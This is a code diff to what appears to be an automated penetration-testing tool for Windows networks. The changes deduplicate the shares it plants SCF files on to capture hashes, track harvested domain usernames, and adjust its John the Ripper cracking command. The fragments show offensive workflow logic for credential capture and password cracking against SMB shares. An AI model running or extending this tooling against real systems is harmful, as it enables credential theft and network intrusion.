@@ -211,7 +211,9 @@ def write_scf_files(lines, ip, args, anon_share_found, iface):
     '''
     Writes SCF files to writeable shares based on Nmap smb-enum-shares output
     '''
+    # lines = just all the nmap script output for one host
     share = None
+    shares_written_to = []
     scf_filepath = create_scf(iface)
 
     for l in lines:
@@ -221,7 +223,7 @@ def write_scf_files(lines, ip, args, anon_share_found, iface):
             if 'Anonymous access:' in l or 'Current user access:' in l:
                 access = l.split()[-1].strip()
 
-                if access == 'READ/WRITE':
+                if access == 'READ/WRITE' and share not in shares_written_to:
                     if '$' not in share:
                         # We only want to check if a single anon share is found
                         # for later "no anon shares found" msg
@@ -239,6 +241,7 @@ def write_scf_files(lines, ip, args, anon_share_found, iface):
                         if not any(x in stdout for x in err_strings) and len(stdout) > 1:
                             print_good('Successfully wrote SCF file to: {}'.format(share))
                             write_to_file('logs/shares-with-SCF.txt', share + '\n', 'a+')
+                            shares_written_to.append(share)
                         else:
                             stdout_lines = stdout.splitlines()
                             for line in stdout_lines:
@@ -647,25 +650,27 @@ def run_theHarvester(ip_users, prev_users, null_sess_hosts, domain, host):
         if '@' in l and 'cmartorella@edge-security.com' not in l:
 
             user = l.split('@')[0]
-            if user not in prev_users:
-                prev_users.append(user)
-
             # If we have AD domains found, use them so user = DOM\user
             if len(null_sess_hosts) > 0:
                 for key,val in null_sess_hosts.items():
                     ip = key
                     dom = val[0]
                     dom_user = dom+'\\'+user
-                    if ip_users.get(ip):
-                        ip_users[ip].append(dom_user)
-                    else:
-                        ip_users[ip] = [dom_user]
+
+                    if dom_user not in prev_users:
+                        prev_users.append(dom_user)
+                        if ip_users.get(ip):
+                            ip_users[ip].append(dom_user)
+                        else:
+                            ip_users[ip] = [dom_user]
             # No AD domains found, just use username
             else:
-                if ip_users.get(host):
-                    ip_users[host].append(user)
-                else:
-                    ip_users[host] = [user]
+                if user not in prev_users:
+                    prev_users.append(user)
+                    if ip_users.get(host):
+                        ip_users[host].append(user)
+                    else:
+                        ip_users[host] = [user]
 
     return ip_users, prev_users
 
@@ -769,7 +774,7 @@ def create_john_cmd(hash_format, hash_file):
     cmd.append(form)
     wordlist = '--wordlist=1mil-AD-passwords.txt'
     cmd.append(wordlist)
-    cmd.append('--rules')
+    #cmd.append('--rules')
     cmd.append(hash_file)
     identifier = hash_file.split('-')[-1].split('.')[0]
     cmd.append('--session={}'.format(identifier))
@@ -802,8 +807,7 @@ def crack_hashes(hashes):
             try:
                 john_proc = run_proc(john_cmd)
             except FileNotFoundError:
-                print_bad('Error running john for password cracking, \
-                           try: cd submodules/JohnTheRipper/src && ./configure && make')
+                print_bad('Error running john for password cracking, try: cd submodules/JohnTheRipper/src && ./configure && make')
             procs.append(john_proc)
 
     return procs
